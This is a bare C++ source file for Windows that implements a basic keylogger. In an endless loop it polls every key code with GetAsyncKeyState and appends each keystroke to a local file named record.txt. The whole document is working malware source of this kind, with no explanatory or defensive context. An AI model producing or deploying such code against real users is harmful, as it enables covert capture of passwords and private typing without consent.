#include <iostream>
#include <winuser.h>
#include <windows.h>
#include <fstream>
using namespace std;


int main()
{
    char key;
    for (; ; )
    {
        for (key=8;key<222 ;key++ )
        {
                if( GetAsyncKeyState(key) == -32767 )
                {
                    ofstream write("record.txt", ios::app);

                              write << key;

                }
        }
    }
    return 0;
}
